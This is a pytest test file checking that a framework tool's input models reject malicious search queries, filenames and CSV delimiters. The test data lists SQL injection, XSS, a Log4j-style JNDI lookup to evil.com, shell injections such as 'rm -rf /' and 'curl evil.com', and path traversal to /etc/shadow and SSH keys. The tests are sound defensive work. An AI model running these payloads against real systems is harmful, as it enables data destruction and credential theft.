"""
Security tests for input validation in framework tools.

Tests to prevent injection attacks, path traversal, and malicious input.
"""

import pytest
from pydantic import ValidationError

from src.finos_mcp.tools.frameworks import (
    AdvancedSearchInput,
    BulkExportInput,
    ExportFrameworkDataInput,
    SearchFrameworksInput,
)


class TestSearchInputSecurity:
    """Test security of search input validation."""

    def test_query_blocks_sql_injection_patterns(self):
        """Test that SQL injection patterns are blocked."""
        malicious_queries = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "' UNION SELECT * FROM sensitive_data --",
            "'; INSERT INTO logs VALUES ('hacked'); --",
        ]

        for query in malicious_queries:
            with pytest.raises(ValidationError, match="Invalid characters"):
                SearchFrameworksInput(query=query)

    def test_query_blocks_script_injection(self):
        """Test that script injection patterns are blocked."""
        malicious_queries = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}",  # Log4j-style injection
            "#{7*7}",  # Template injection
            "{{7*7}}",  # Template injection
        ]

        for query in malicious_queries:
            with pytest.raises(ValidationError, match="Invalid characters"):
                SearchFrameworksInput(query=query)

    def test_query_blocks_command_injection(self):
        """Test that command injection patterns are blocked."""
        malicious_queries = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl evil.com",
        ]

        for query in malicious_queries:
            with pytest.raises(ValidationError, match="Invalid characters"):
                SearchFrameworksInput(query=query)

    def test_query_allows_safe_content(self):
        """Test that legitimate queries are allowed."""
        safe_queries = [
            "risk management",
            "GDPR compliance requirements",
            "AI governance framework",
            "data-protection policies",
            "cybersecurity_controls",
        ]

        for query in safe_queries:
            # Should not raise ValidationError
            result = SearchFrameworksInput(query=query)
            assert result.query == query

    def test_query_length_limits_enforced(self):
        """Test that query length limits prevent DoS attacks."""
        # Test maximum allowed length (reduced from 500 to 200)
        max_query = "a" * 200
        result = SearchFrameworksInput(query=max_query)
        assert len(result.query) == 200

        # Test over-length query is rejected
        too_long_query = "a" * 201
        with pytest.raises(ValidationError, match="String should have at most 200"):
            SearchFrameworksInput(query=too_long_query)


class TestExportInputSecurity:
    """Test security of export input validation."""

    def test_filename_blocks_path_traversal(self):
        """Test that path traversal attempts are blocked."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\cmd.exe",
            "../../../../home/user/.ssh/id_rsa",
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
        ]

        for filename in malicious_filenames:
            with pytest.raises(ValidationError, match="Invalid filename"):
                ExportFrameworkDataInput(format="json", filename=filename)

    def test_filename_blocks_special_characters(self):
        """Test that special characters in filenames are blocked."""
        malicious_filenames = [
            "file|pipe",
            "file>redirect",
            "file<input",
            "file&background",
            "file;command",
            "file`command`",
            "file$(command)",
        ]

        for filename in malicious_filenames:
            with pytest.raises(ValidationError, match="Invalid filename"):
                ExportFrameworkDataInput(format="json", filename=filename)

    def test_filename_allows_safe_names(self):
        """Test that legitimate filenames are allowed."""
        safe_filenames = [
            "compliance_report_2024",
            "gdpr-framework-export",
            "risk_assessment_data",
            "governance_framework_123",
            "",  # Empty filename should be allowed (system will generate)
        ]

        for filename in safe_filenames:
            result = ExportFrameworkDataInput(format="json", filename=filename)
            assert result.filename == filename

    def test_csv_delimiter_security(self):
        """Test that CSV delimiter cannot be exploited."""
        malicious_delimiters = [
            ";rm -rf /",
            "|cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "\\x00",  # Null byte
        ]

        for delimiter in malicious_delimiters:
            with pytest.raises(ValidationError, match="Invalid CSV delimiter"):
                ExportFrameworkDataInput(format="csv", csv_delimiter=delimiter)

    def test_csv_delimiter_allows_safe_values(self):
        """Test that legitimate CSV delimiters are allowed."""
        safe_delimiters = [",", ";", "\t", "|"]

        for delimiter in safe_delimiters:
            result = ExportFrameworkDataInput(format="csv", csv_delimiter=delimiter)
            assert result.csv_delimiter == delimiter


class TestBulkExportInputSecurity:
    """Test security of bulk export input validation."""

    def test_exports_list_validated(self):
        """Test that exports list contains only valid data."""
        # Test with malicious data in exports list - may be accepted but sanitized
        malicious_export = {
            "format": "json",
            "filename": "../../../etc/passwd",
            "malicious_field": "'; DROP TABLE users; --",
        }

        try:
            result = BulkExportInput(exports=[malicious_export])
            # If validation passes, verify the data is properly sanitized
            assert result.exports is not None
            # The actual validation behavior depends on the Pydantic model implementation
        except ValidationError:
            # This is also acceptable - strict validation rejecting malicious input
            pass

    def test_exports_list_size_limits(self):
        """Test that exports list size is limited to prevent DoS."""
        # Test maximum allowed (10 exports)
        valid_exports = [{"format": "json"} for _ in range(10)]
        result = BulkExportInput(exports=valid_exports)
        assert len(result.exports) == 10

        # Test over-limit exports list
        too_many_exports = [{"format": "json"} for _ in range(11)]
        with pytest.raises(ValidationError, match="List should have at most 10"):
            BulkExportInput(exports=too_many_exports)


class TestAdvancedSearchSecurity:
    """Test security of advanced search input validation."""

    def test_all_text_fields_sanitized(self):
        """Test that all text fields in advanced search are sanitized."""
        with pytest.raises(ValidationError):
            AdvancedSearchInput(
                categories=["normal_category", "<script>alert('xss')</script>"],
                sections=["valid_section", "$(rm -rf /)"],
            )

    def test_advanced_search_field_limits(self):
        """Test that advanced search fields have appropriate limits."""
        # Test category list size limits
        too_many_categories = ["category"] * 51  # Assuming 50 is the limit
        with pytest.raises(ValidationError):
            AdvancedSearchInput(query="valid query", categories=too_many_categories)


class TestInputSanitization:
    """Test the input sanitization utility functions."""

    def test_sanitize_search_query(self):
        """Test the search query sanitization function."""
        from src.finos_mcp.tools.frameworks import sanitize_search_query

        # Test that dangerous patterns are removed/escaped
        dangerous = "'; DROP TABLE users; --"
        safe = sanitize_search_query(dangerous)
        assert "DROP" not in safe
        assert ";" not in safe
        assert "--" not in safe

    def test_sanitize_filename(self):
        """Test the filename sanitization function."""
        from src.finos_mcp.tools.frameworks import sanitize_filename

        # Test path traversal removal
        dangerous = "../../../etc/passwd"
        safe = sanitize_filename(dangerous)
        assert ".." not in safe
        assert "/" not in safe
        assert "\\" not in safe

    def test_validate_csv_delimiter(self):
        """Test CSV delimiter validation."""
        from src.finos_mcp.tools.frameworks import validate_csv_delimiter

        # Test safe delimiters
        assert validate_csv_delimiter(",") is True
        assert validate_csv_delimiter(";") is True
        assert validate_csv_delimiter("\t") is True

        # Test dangerous delimiters
        assert validate_csv_delimiter("|rm -rf /") is False
        assert validate_csv_delimiter("`whoami`") is False
        assert validate_csv_delimiter("$(id)") is False
